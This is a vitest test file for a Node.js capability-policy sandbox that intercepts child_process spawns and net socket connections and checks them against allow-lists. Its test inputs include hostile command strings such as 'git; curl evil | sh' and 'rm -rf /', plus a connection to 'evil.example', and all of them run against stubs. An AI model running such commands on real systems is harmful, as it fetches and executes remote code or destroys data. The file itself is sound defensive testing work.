import { createRequire } from "node:module";
import { afterEach, describe, expect, test, vi } from "vitest";
import { CapabilityPolicy } from "./capability-policy";
import {
    defaultShellProgram,
    installBuiltinModuleEnforcement,
    netTargetFromConnectArgs,
    programFromArg,
    programFromExecArgs,
    programFromSpawnFamilyArgs,
    programFromSpawnOptions,
    shellFromOptions,
} from "./enforced-builtins";
import { NetworkPolicyError } from "./enforced-net";
import { ProcessPolicyError } from "./enforced-process";

const nodeRequire = createRequire(import.meta.url);

/**
 * Build the layered `--enforce` JSON the Rust `ShimPolicy` emits from a single
 * policy level. `enforced` is derived from the domains the layer names.
 */
function enforceJson(
    layer: Record<string, { allow?: string[]; deny?: string[] }>,
): string {
    return JSON.stringify({ enforced: Object.keys(layer), layers: [layer] });
}

describe("netTargetFromConnectArgs", () => {
    test("(port, host) form", () => {
        expect(netTargetFromConnectArgs([443, "example.com"])).toEqual({
            host: "example.com",
            port: 443,
        });
    });

    test("(port) form defaults the host to localhost", () => {
        expect(netTargetFromConnectArgs([8080])).toEqual({
            host: "localhost",
            port: 8080,
        });
    });

    test("options object with port and host", () => {
        expect(
            netTargetFromConnectArgs([{ port: 5432, host: "db.internal" }]),
        ).toEqual({ host: "db.internal", port: 5432 });
    });

    test("unwraps the normalized [options, callback] array net.connect produces", () => {
        // net.connect(443, "example.com") reaches Socket.prototype.connect as a
        // single [{ port, host }, cb] array.
        expect(
            netTargetFromConnectArgs([
                [{ port: 443, host: "example.com" }, null],
            ]),
        ).toEqual({ host: "example.com", port: 443 });
        expect(
            netTargetFromConnectArgs([[{ path: "/tmp/x.sock" }, null]]),
        ).toBeNull();
    });

    test("IPC forms (string path / { path }) yield null", () => {
        expect(netTargetFromConnectArgs(["/tmp/app.sock"])).toBeNull();
        expect(
            netTargetFromConnectArgs([{ path: "/tmp/app.sock" }]),
        ).toBeNull();
    });

    test("indeterminate forms yield null (fall through to the floor)", () => {
        expect(netTargetFromConnectArgs([])).toBeNull();
        expect(
            netTargetFromConnectArgs([{ host: "no-port.example" }]),
        ).toBeNull();
    });
});

describe("program extraction (shell-as-program model)", () => {
    test("a direct executable is authorized as itself", () => {
        expect(programFromArg("git")).toBe("git");
        expect(programFromArg("")).toBeNull();
        expect(programFromArg(123)).toBeNull();
    });

    test("shellFromOptions surfaces the requested shell binary", () => {
        const sh = defaultShellProgram();
        // `{ shell: true }` → the platform default shell.
        expect(shellFromOptions(["git status", { shell: true }])).toBe(sh);
        // An explicit string override wins.
        expect(shellFromOptions(["git status", { shell: "/bin/bash" }])).toBe(
            "/bin/bash",
        );
        // No shell requested → a direct spawn.
        expect(shellFromOptions(["git", { cwd: "/tmp" }])).toBeNull();
        expect(shellFromOptions(["git"])).toBeNull();
    });

    test("the spawn family authorizes the shell for a shell invocation, else the executable", () => {
        // A shell spawn resolves to the shell binary, NOT the first token of
        // the (injectable) command line.
        expect(
            programFromSpawnFamilyArgs(["git; curl evil", { shell: true }]),
        ).toBe(defaultShellProgram());
        // A direct spawn resolves to its executable.
        expect(programFromSpawnFamilyArgs(["git", ["status"]])).toBe("git");
    });

    test("exec/execSync always authorize the shell, never the command line", () => {
        // The whole point of #4: the shell runs an arbitrary command line, so
        // the authorized program is the shell — injecting `; curl` cannot
        // launder authority through a benign-looking first token.
        expect(programFromExecArgs(["git status"])).toBe(defaultShellProgram());
        expect(programFromExecArgs(["git; curl evil | sh"])).toBe(
            defaultShellProgram(),
        );
        expect(
            programFromExecArgs(["git status", { shell: "/bin/bash" }]),
        ).toBe("/bin/bash");
        // No command line → nothing to authorize.
        expect(programFromExecArgs([""])).toBeNull();
        expect(programFromExecArgs([42])).toBeNull();
    });
});

describe("programFromSpawnOptions (ChildProcess.prototype.spawn payload)", () => {
    test("a direct spawn resolves to its executable", () => {
        expect(
            programFromSpawnOptions({ file: "git", args: ["git", "status"] }),
        ).toBe("git");
    });

    test("a shell invocation resolves to the shell binary the runtime resolved", () => {
        // The runtime has already resolved `file` to the shell itself, so we
        // authorize the shell — not the inner command line's first token.
        expect(
            programFromSpawnOptions({
                file: "/bin/sh",
                args: ["/bin/sh", "-c", "rm -rf /tmp"],
                shell: true,
            }),
        ).toBe("/bin/sh");
    });

    test("indeterminate payloads yield null", () => {
        expect(programFromSpawnOptions(undefined)).toBeNull();
        expect(programFromSpawnOptions({})).toBeNull();
        expect(programFromSpawnOptions({ shell: true, args: [] })).toBeNull();
    });
});

describe("installBuiltinModuleEnforcement — node:child_process", () => {
    const cp = nodeRequire("node:child_process") as Record<string, unknown>;
    const originals = new Map<string, unknown>();

    afterEach(() => {
        for (const [key, value] of originals) {
            cp[key] = value;
        }
        originals.clear();
    });

    function stub(key: string) {
        originals.set(key, cp[key]);
        const spy = vi.fn(() => "spawned");
        cp[key] = spy;
        return spy;
    }

    test("denies a spawn of a program outside the allow-list", () => {
        const spawn = stub("spawn");
        const policy = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(policy);

        expect(() => (cp.spawn as (...a: unknown[]) => unknown)("rm")).toThrow(
            ProcessPolicyError,
        );
        expect(spawn).not.toHaveBeenCalled();
    });

    test("permits an allowed program and delegates to the real binding", () => {
        const spawn = stub("spawn");
        const policy = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(policy);

        expect(
            (cp.spawn as (...a: unknown[]) => unknown)("git", ["status"]),
        ).toBe("spawned");
        expect(spawn).toHaveBeenCalledOnce();
    });

    test("exec authorizes the shell (not the command line's first token)", () => {
        const exec = stub("exec");
        // The `process` policy grants only the shell binary, not `git`.
        const policy = CapabilityPolicy.parse(
            enforceJson({
                process: { allow: [defaultShellProgram()] },
            }),
        );
        installBuiltinModuleEnforcement(policy);

        // A benign-looking first token cannot smuggle an injected command past
        // the check: `exec` authorizes the shell, which the policy grants here.
        (cp.exec as (...a: unknown[]) => unknown)("git; curl evil | sh");
        expect(exec).toHaveBeenCalledOnce();
    });

    test("exec is denied when the policy does not grant the shell", () => {
        const exec = stub("exec");
        // Granting `git` no longer implies the right to run a shell: `exec`
        // always spawns the shell, so a shell grant is required.
        const policy = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(policy);

        expect(() =>
            (cp.exec as (...a: unknown[]) => unknown)("git status"),
        ).toThrow(ProcessPolicyError);
        expect(exec).not.toHaveBeenCalled();
    });

    test("leaves child_process untouched when process is not enforced", () => {
        const spawn = stub("spawn");
        installBuiltinModuleEnforcement(CapabilityPolicy.empty());
        // Not wrapped → the raw stub is called with no policy check.
        (cp.spawn as (...a: unknown[]) => unknown)("anything");
        expect(spawn).toHaveBeenCalledOnce();
    });
});

describe("installBuiltinModuleEnforcement — ChildProcess.prototype.spawn", () => {
    const cpProto = nodeRequire("node:child_process") as {
        ChildProcess: { prototype: Record<string, unknown> };
    };
    let original: unknown;

    afterEach(() => {
        if (original !== undefined) {
            cpProto.ChildProcess.prototype.spawn = original as never;
            original = undefined;
        }
    });

    function stubProtoSpawn() {
        original = cpProto.ChildProcess.prototype.spawn;
        const spy = vi.fn(function (this: unknown) {
            return this;
        });
        cpProto.ChildProcess.prototype.spawn = spy as never;
        return spy;
    }

    test("denies a direct spawn of a program outside the allow-list", () => {
        const protoSpawn = stubProtoSpawn();
        const policy = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(policy);

        const child = Object.create(cpProto.ChildProcess.prototype) as {
            spawn: (...a: unknown[]) => unknown;
        };
        expect(() =>
            child.spawn({ file: "rm", args: ["rm", "-rf", "/"] }),
        ).toThrow(ProcessPolicyError);
        expect(protoSpawn).not.toHaveBeenCalled();

        child.spawn({ file: "git", args: ["git", "status"] });
        expect(protoSpawn).toHaveBeenCalledOnce();
    });

    test("authorizes the shell binary of a shell invocation, not the inner command", () => {
        const protoSpawn = stubProtoSpawn();
        // Granting only `git` must NOT authorize a shell that could run `git`
        // plus anything else; the shell binary itself is the program.
        const gitOnly = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(gitOnly);

        const child = Object.create(cpProto.ChildProcess.prototype) as {
            spawn: (...a: unknown[]) => unknown;
        };
        expect(() =>
            child.spawn({
                file: "/bin/sh",
                args: ["/bin/sh", "-c", "git status"],
                shell: true,
            }),
        ).toThrow(ProcessPolicyError);
        expect(protoSpawn).not.toHaveBeenCalled();
    });

    test("permits a shell invocation when the policy grants the shell", () => {
        const protoSpawn = stubProtoSpawn();
        const shellAllowed = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["/bin/sh"] } }),
        );
        installBuiltinModuleEnforcement(shellAllowed);

        const child = Object.create(cpProto.ChildProcess.prototype) as {
            spawn: (...a: unknown[]) => unknown;
        };
        // Even an injected command line is within policy once the shell is
        // explicitly granted — the grant honestly means "may run a shell".
        child.spawn({
            file: "/bin/sh",
            args: ["/bin/sh", "-c", "git; curl evil | sh"],
            shell: true,
        });
        expect(protoSpawn).toHaveBeenCalledOnce();
    });
});

describe("installBuiltinModuleEnforcement — node:net", () => {
    const net = nodeRequire("node:net") as {
        Socket: { prototype: Record<string, unknown> };
    };
    let original: unknown;

    afterEach(() => {
        if (original !== undefined) {
            net.Socket.prototype.connect = original as never;
            original = undefined;
        }
    });

    function stubConnect() {
        original = net.Socket.prototype.connect;
        const spy = vi.fn(function (this: unknown) {
            return this;
        });
        net.Socket.prototype.connect = spy as never;
        return spy;
    }

    test("denies a raw socket to a host outside the allow-list", () => {
        const connect = stubConnect();
        const policy = CapabilityPolicy.parse(
            enforceJson({ net: { allow: ["example.com:443"] } }),
        );
        installBuiltinModuleEnforcement(policy);

        const socket = Object.create(net.Socket.prototype) as {
            connect: (...a: unknown[]) => unknown;
        };
        expect(() => socket.connect(443, "evil.example")).toThrow(
            NetworkPolicyError,
        );
        expect(connect).not.toHaveBeenCalled();

        socket.connect(443, "example.com");
        expect(connect).toHaveBeenCalledOnce();
    });
});
